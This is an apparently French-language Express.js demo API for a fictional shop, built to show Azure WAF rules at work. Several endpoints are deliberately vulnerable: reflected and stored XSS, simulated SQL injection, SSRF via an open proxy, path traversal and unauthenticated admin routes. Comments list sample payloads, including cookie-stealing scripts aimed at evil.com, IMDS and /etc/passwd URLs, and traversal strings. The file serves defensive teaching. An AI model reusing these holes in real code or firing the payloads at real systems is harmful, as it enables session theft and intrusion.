/**
 * WAF Demo Service - Plateforme de démonstration pour Azure App Gateway + WAF
 *
 * Service fictif : API d'une boutique en ligne "ShopSecure"
 * Toutes les données sont en mémoire (pas de base de données)
 *
 * Endpoints organisés pour démontrer les protections WAF :
 *   - Recherche produits  → XSS
 *   - Lookup utilisateur  → SQL Injection (simulé)
 *   - Commentaires        → Stored XSS
 *   - Proxy externe       → SSRF
 *   - Upload de fichier   → Path Traversal
 *   - Admin               → Broken Access Control
 *   - Health / Info       → endpoints neutres
 */

const express = require("express");
const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// ─────────────────────────────────────────────
// DONNÉES EN MÉMOIRE
// ─────────────────────────────────────────────

const PRODUCTS = [
  { id: 1, name: "Laptop Pro 15", category: "informatique", price: 1299, stock: 12, description: "Intel Core i7, 16 Go RAM, SSD 512 Go" },
  { id: 2, name: "Écran 4K 27\"", category: "informatique", price: 449, stock: 34, description: "IPS, 144 Hz, HDR10" },
  { id: 3, name: "Souris Ergonomique", category: "accessoires", price: 89, stock: 120, description: "Sans fil, DPI réglable" },
  { id: 4, name: "Clavier Mécanique", category: "accessoires", price: 149, stock: 55, description: "Switch Cherry MX Red, rétro-éclairé" },
  { id: 5, name: "Casque Gamer", category: "audio", price: 199, stock: 28, description: "Son surround 7.1, micro amovible" },
  { id: 6, name: "Webcam HD", category: "accessoires", price: 79, stock: 67, description: "1080p, autofocus, micro intégré" },
  { id: 7, name: "SSD Externe 1 To", category: "stockage", price: 109, stock: 89, description: "USB-C, 1050 Mo/s en lecture" },
  { id: 8, name: "Hub USB-C 7 ports", category: "accessoires", price: 59, stock: 200, description: "Compatible Thunderbolt 4" },
];

const USERS = [
  { id: 1, username: "alice", email: "alice@shopsecure.fr", role: "user", joinDate: "2024-01-15" },
  { id: 2, username: "bob", email: "bob@shopsecure.fr", role: "user", joinDate: "2024-03-22" },
  { id: 3, username: "charlie", email: "charlie@shopsecure.fr", role: "moderator", joinDate: "2023-11-05" },
  { id: 4, username: "admin", email: "admin@shopsecure.fr", role: "admin", joinDate: "2023-01-01" },
];

// Les commentaires sont stockés en mémoire (s'effacent au redémarrage)
const COMMENTS = [
  { id: 1, productId: 1, author: "alice", text: "Excellent produit, livraison rapide !", date: "2025-12-10" },
  { id: 2, productId: 1, author: "bob", text: "Bon rapport qualité/prix.", date: "2026-01-05" },
  { id: 3, productId: 3, author: "charlie", text: "Confortable après de longues heures.", date: "2026-02-01" },
];

let nextCommentId = 4;

// ─────────────────────────────────────────────
// UTILITAIRES
// ─────────────────────────────────────────────

// Sanitisation BASIQUE (insuffisante seule — le WAF fait le vrai travail)
const sanitizeHtml = (str) =>
  String(str)
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;");

// ─────────────────────────────────────────────
// HEALTH & INFO
// ─────────────────────────────────────────────

/**
 * GET /health
 * Sonde utilisée par l'App Gateway (health probe)
 */
app.get("/health", (req, res) => {
  res.json({
    status: "healthy",
    service: "ShopSecure API",
    version: "1.0.0",
    timestamp: new Date().toISOString(),
    uptime: Math.floor(process.uptime()),
  });
});

/**
 * GET /
 * Page d'accueil de l'API
 */
app.get("/", (req, res) => {
  res.json({
    service: "ShopSecure API",
    description: "API de démonstration pour Azure App Gateway + WAF",
    endpoints: {
      "GET  /health":                   "Health probe pour App Gateway",
      "GET  /products":                 "Liste des produits (avec filtres)",
      "GET  /products/:id":             "Détail d'un produit",
      "GET  /search?q=":               "Recherche full-text (vecteur XSS)",
      "GET  /users/:username":          "Profil utilisateur public (vecteur SQLi simulé)",
      "GET  /products/:id/comments":   "Commentaires d'un produit",
      "POST /products/:id/comments":   "Ajouter un commentaire (vecteur Stored XSS)",
      "POST /proxy":                   "Proxy URL externe (vecteur SSRF)",
      "GET  /files":                   "Lecture fichier statique (vecteur Path Traversal)",
      "GET  /admin/dashboard":         "Dashboard admin (vecteur Broken Access Control)",
      "GET  /admin/users":             "Liste complète des utilisateurs (admin only)",
    },
  });
});

// ─────────────────────────────────────────────
// PRODUITS
// ─────────────────────────────────────────────

/**
 * GET /products?category=&minPrice=&maxPrice=&sort=
 * Liste filtrée des produits
 */
app.get("/products", (req, res) => {
  let results = [...PRODUCTS];

  if (req.query.category) {
    results = results.filter((p) =>
      p.category.toLowerCase() === req.query.category.toLowerCase()
    );
  }
  if (req.query.minPrice) {
    results = results.filter((p) => p.price >= Number(req.query.minPrice));
  }
  if (req.query.maxPrice) {
    results = results.filter((p) => p.price <= Number(req.query.maxPrice));
  }
  if (req.query.sort === "price_asc") results.sort((a, b) => a.price - b.price);
  if (req.query.sort === "price_desc") results.sort((a, b) => b.price - a.price);

  res.json({ count: results.length, products: results });
});

/**
 * GET /products/:id
 */
app.get("/products/:id", (req, res) => {
  const product = PRODUCTS.find((p) => p.id === Number(req.params.id));
  if (!product) return res.status(404).json({ error: "Produit introuvable" });
  res.json(product);
});

// ─────────────────────────────────────────────
// VECTEUR 1 — XSS : Recherche
// ─────────────────────────────────────────────

/**
 * GET /search?q=<terme>
 *
 * OWASP A03 – Injection (XSS)
 * La valeur de `q` est reflétée dans la réponse.
 *
 * Attaque type :
 *   GET /search?q=<script>alert(document.cookie)</script>
 *   GET /search?q=<img src=x onerror=fetch('https://evil.com/?c='+document.cookie)>
 *
 * Protection WAF :
 *   - Règle OWASP CRS : REQUEST-941-APPLICATION-ATTACK-XSS
 *   - Mode Prévention → requête bloquée (HTTP 403)
 */
app.get("/search", (req, res) => {
  const query = req.query.q || "";

  const results = PRODUCTS.filter(
    (p) =>
      p.name.toLowerCase().includes(query.toLowerCase()) ||
      p.description.toLowerCase().includes(query.toLowerCase()) ||
      p.category.toLowerCase().includes(query.toLowerCase())
  );

  res.json({
    query,           // ← valeur brute reflétée dans la réponse
    resultCount: results.length,
    results,
    warning: "[DEMO] Le paramètre `query` est reflété tel quel — vecteur XSS réfléchi",
  });
});

// ─────────────────────────────────────────────
// VECTEUR 2 — SQL Injection simulée : Lookup utilisateur
// ─────────────────────────────────────────────

/**
 * GET /users/:username
 *
 * OWASP A03 – Injection (SQLi)
 * Simule une requête "SELECT * FROM users WHERE username = '<param>'"
 * Ici les données sont en mémoire, mais la réponse reflète le payload
 * pour illustrer ce qu'un WAF doit intercepter.
 *
 * Attaques types :
 *   GET /users/alice' OR '1'='1
 *   GET /users/admin'--
 *   GET /users/'; DROP TABLE users;--
 *
 * Protection WAF :
 *   - Règle OWASP CRS : REQUEST-942-APPLICATION-ATTACK-SQLI
 */
app.get("/users/:username", (req, res) => {
  const { username } = req.params;

  // Simulation de ce que serait la requête SQL (purement illustratif)
  const simulatedQuery = `SELECT id, username, email, role FROM users WHERE username = '${username}'`;

  const user = USERS.find(
    (u) => u.username.toLowerCase() === username.toLowerCase()
  );

  if (!user) {
    return res.status(404).json({
      error: "Utilisateur introuvable",
      simulatedQuery,
      warning: "[DEMO] Vecteur SQLi — payload reflété dans simulatedQuery",
    });
  }

  const { email: _, ...publicProfile } = user;  // email masqué pour user standard
  res.json({ user: publicProfile, simulatedQuery });
});

// ─────────────────────────────────────────────
// VECTEUR 3 — Stored XSS : Commentaires
// ─────────────────────────────────────────────

/**
 * GET /products/:id/comments
 */
app.get("/products/:id/comments", (req, res) => {
  const productId = Number(req.params.id);
  const product = PRODUCTS.find((p) => p.id === productId);
  if (!product) return res.status(404).json({ error: "Produit introuvable" });

  const comments = COMMENTS.filter((c) => c.productId === productId);
  res.json({ productId, productName: product.name, comments });
});

/**
 * POST /products/:id/comments
 * Body: { author: string, text: string }
 *
 * OWASP A03 – Stored XSS
 * Le commentaire est stocké en mémoire et re-servi à tous les visiteurs.
 *
 * Attaque type :
 *   { "author": "hacker", "text": "<script>document.location='https://evil.com/?c='+document.cookie</script>" }
 *
 * Protection WAF :
 *   - Règle OWASP CRS : REQUEST-941-APPLICATION-ATTACK-XSS
 *   - En mode Prévention, la requête POST est bloquée avant stockage
 */
app.post("/products/:id/comments", (req, res) => {
  const productId = Number(req.params.id);
  const product = PRODUCTS.find((p) => p.id === productId);
  if (!product) return res.status(404).json({ error: "Produit introuvable" });

  const { author, text } = req.body;
  if (!author || !text) {
    return res.status(400).json({ error: "Champs `author` et `text` requis" });
  }
  if (text.length > 500) {
    return res.status(400).json({ error: "Commentaire trop long (max 500 caractères)" });
  }

  const comment = {
    id: nextCommentId++,
    productId,
    author: sanitizeHtml(author),
    text,          // ← stocké sans sanitisation complète pour la démo
    date: new Date().toISOString().split("T")[0],
    warning: "[DEMO] `text` stocké sans sanitisation complète — vecteur Stored XSS",
  };

  COMMENTS.push(comment);
  res.status(201).json({ message: "Commentaire ajouté", comment });
});

// ─────────────────────────────────────────────
// FAUX POSITIF — Support technique (tickets)
// ─────────────────────────────────────────────

/**
 * POST /support/tickets
 * Body: { subject: string, message: string, email: string }
 *
 * CAS DE FAUX POSITIF TYPIQUE
 * ───────────────────────────
 * Les clients ouvrent des tickets pour signaler des bugs.
 * Un développeur peut légitimement écrire dans son message :
 *
 *   "Bonjour, j'ai une erreur quand je lance la requête :
 *    SELECT * FROM orders WHERE user_id = '123' AND status = 'pending'
 *    Elle retourne NULL au lieu des résultats attendus."
 *
 * → La règle OWASP CRS 942100 (SQLI) détecte "SELECT * FROM" et "AND status ="
 *   et BLOQUE la requête en mode Prévention (HTTP 403) alors qu'elle est légitime.
 *
 * Autre exemple XSS faux positif :
 *   "Mon affichage est cassé, voici le HTML généré :
 *    <div class='product' onclick='addToCart(12)'>Laptop</div>"
 *
 * → La règle 941100 (XSS) détecte "onclick=" et bloque.
 *
 * SOLUTION WAF — Exclusion ciblée (whitelisting) :
 *   Ne PAS désactiver toute la règle. Créer une exclusion :
 *
 *   matchVariable  : RequestBodyPostArgNames
 *   operator       : Equals
 *   selector       : message          ← uniquement le champ "message"
 *   ruleGroupName  : SQLI             ← uniquement les règles SQLi
 *   rules          : 942100, 942110, 942120, 942150, 942200, 942210, 942260
 *
 *   → Le WAF continue de protéger tous les autres endpoints et tous les autres
 *     champs, mais tolère le contenu technique dans le corps du ticket.
 *
 * BONNE PRATIQUE :
 *   1. Démarrer en mode Détection, observer les logs WAF (Log Analytics)
 *   2. Identifier les règles qui bloquent du trafic légitime
 *   3. Créer des exclusions ciblées (champ + règle + route), jamais globales
 *   4. Basculer en mode Prévention une fois les exclusions validées
 */

const TICKETS = [
  {
    id: 1,
    subject: "Commande introuvable",
    message: "Bonjour, ma commande #4521 n'apparaît plus dans mon espace client.",
    email: "alice@shopsecure.fr",
    status: "open",
    createdAt: "2026-02-20T10:00:00Z",
  },
];
let nextTicketId = 2;

app.post("/support/tickets", (req, res) => {
  const { subject, message, email } = req.body;

  if (!subject || !message || !email) {
    return res.status(400).json({ error: "Champs `subject`, `message` et `email` requis" });
  }
  if (message.length > 2000) {
    return res.status(400).json({ error: "Message trop long (max 2000 caractères)" });
  }

  const ticket = {
    id: nextTicketId++,
    subject,
    message,   // ← contenu technique légitime (SQL, HTML) → déclenche faux positif WAF
    email,
    status: "open",
    createdAt: new Date().toISOString(),
    falsePositiveNote: [
      "[DEMO] Ce champ peut contenir du SQL ou du HTML légitimes (bug report).",
      "Sans exclusion WAF : HTTP 403 sur requête innocente.",
      "Exclusion recommandée : règles SQLi/XSS exclues sur RequestBodyPostArgNames:message pour POST /support/tickets uniquement.",
    ],
  };

  TICKETS.push(ticket);
  res.status(201).json({ message: "Ticket créé", ticket });
});

app.get("/support/tickets", (req, res) => {
  res.json({ count: TICKETS.length, tickets: TICKETS });
});

// ─────────────────────────────────────────────
// VECTEUR 4 — SSRF : Proxy externe
// ─────────────────────────────────────────────

/**
 * POST /proxy
 * Body: { url: string }
 *
 * OWASP A10 – SSRF (Server-Side Request Forgery)
 * Le serveur effectue une requête HTTP vers l'URL fournie par le client.
 *
 * Attaques types :
 *   { "url": "http://169.254.169.254/metadata/instance?api-version=2021-02-01" }  ← Azure IMDS
 *   { "url": "http://10.0.0.1/admin" }   ← réseau interne VNet
 *   { "url": "file:///etc/passwd" }
 *
 * Protection WAF :
 *   - Règle custom WAF : bloquer les plages IP privées et metadata endpoints
 *   - Règle OWASP CRS : REQUEST-934-APPLICATION-ATTACK-GENERIC (SSRF)
 */
app.post("/proxy", async (req, res) => {
  const { url } = req.body;
  if (!url) return res.status(400).json({ error: "Champ `url` requis" });

  // Blocage minimal côté applicatif (le WAF fait le vrai travail)
  const BLOCKED_PATTERNS = [
    /169\.254\.169\.254/,   // Azure / AWS metadata
    /127\.0\.0\.1/,
    /localhost/i,
  ];

  const isBlocked = BLOCKED_PATTERNS.some((p) => p.test(url));
  if (isBlocked) {
    return res.status(403).json({
      error: "URL bloquée par la politique de sécurité applicative",
      url,
    });
  }

  try {
    const controller = new AbortController();
    const timeout = setTimeout(() => controller.abort(), 5000);

    const response = await fetch(url, {
      signal: controller.signal,
      headers: { "User-Agent": "ShopSecure-Proxy/1.0" },
    });
    clearTimeout(timeout);

    const contentType = response.headers.get("content-type") || "";
    const body = contentType.includes("json")
      ? await response.json()
      : await response.text();

    res.json({
      fetchedUrl: url,
      status: response.status,
      contentType,
      body,
      warning: "[DEMO] Vecteur SSRF — le serveur a contacté l'URL distante",
    });
  } catch (err) {
    res.status(502).json({ error: "Impossible de joindre l'URL", detail: err.message });
  }
});

// ─────────────────────────────────────────────
// VECTEUR 5 — Path Traversal : Fichiers statiques
// ─────────────────────────────────────────────

/**
 * GET /files?name=<fichier>
 *
 * OWASP A01 – Path Traversal / Broken Access Control
 *
 * Attaques types :
 *   GET /files?name=../../../etc/passwd
 *   GET /files?name=..%2F..%2F..%2Fetc%2Fshadow
 *   GET /files?name=....//....//etc/passwd  (double encoding)
 *
 * Protection WAF :
 *   - Règle OWASP CRS : REQUEST-930-APPLICATION-ATTACK-LFI
 */

// Catalogue des fichiers autorisés (aucun accès disque réel)
const STATIC_FILES = {
  "cgu.txt": "Conditions Générales d'Utilisation de ShopSecure...",
  "faq.txt": "Q: Puis-je retourner un produit ? R: Oui, sous 30 jours.",
  "contact.txt": "Email : contact@shopsecure.fr | Tél : +33 1 23 45 67 89",
};

app.get("/files", (req, res) => {
  const { name } = req.query;
  if (!name) {
    return res.json({ availableFiles: Object.keys(STATIC_FILES) });
  }

  // Détection basique de traversal (insuffisante face au double-encoding)
  if (name.includes("..") || name.includes("/") || name.includes("\\")) {
    return res.status(400).json({
      error: "Nom de fichier invalide",
      warning: "[DEMO] Tentative de Path Traversal détectée côté app",
    });
  }

  const content = STATIC_FILES[name];
  if (!content) {
    return res.status(404).json({
      error: "Fichier introuvable",
      requestedFile: name,
      warning: "[DEMO] Le nom de fichier est reflété — vecteur Path Traversal si encoding contourné",
    });
  }

  res.json({ file: name, content });
});

// ─────────────────────────────────────────────
// VECTEUR 6 — Broken Access Control : Admin
// ─────────────────────────────────────────────

/**
 * GET /admin/dashboard
 * GET /admin/users
 *
 * OWASP A01 – Broken Access Control
 * Ces routes admin n'ont pas d'authentification dans la démo.
 *
 * Attaque type :
 *   GET /admin/dashboard  (sans token, sans authentification)
 *   GET /admin/users      (exfiltration des données utilisateurs)
 */
app.get("/admin/dashboard", (req, res) => {
  const token = req.headers["x-admin-token"];

  res.json({
    warning: "[DEMO] Broken Access Control — endpoint admin accessible sans auth robuste",
    tokenProvided: !!token,
    dashboard: {
      totalProducts: PRODUCTS.length,
      totalUsers: USERS.length,
      totalComments: COMMENTS.length,
      revenue: PRODUCTS.reduce((sum, p) => sum + p.price * (100 - p.stock), 0),
      topCategory: "informatique",
    },
  });
});

app.get("/admin/users", (req, res) => {
  const token = req.headers["x-admin-token"];

  res.json({
    warning: "[DEMO] Exfiltration de données — liste complète exposée sans auth",
    tokenProvided: !!token,
    users: USERS,
  });
});

// ─────────────────────────────────────────────
// ERREURS GLOBALES
// ─────────────────────────────────────────────

app.use((req, res) => {
  res.status(404).json({ error: "Route introuvable", path: req.path });
});

app.use((err, req, res, _next) => {
  console.error(err);
  res.status(500).json({ error: "Erreur interne du serveur" });
});

// ─────────────────────────────────────────────
// DÉMARRAGE
// ─────────────────────────────────────────────

app.listen(PORT, () => {
  console.log(`ShopSecure API démarrée sur le port ${PORT}`);
  console.log(`http://localhost:${PORT}/`);
});

module.exports = app;
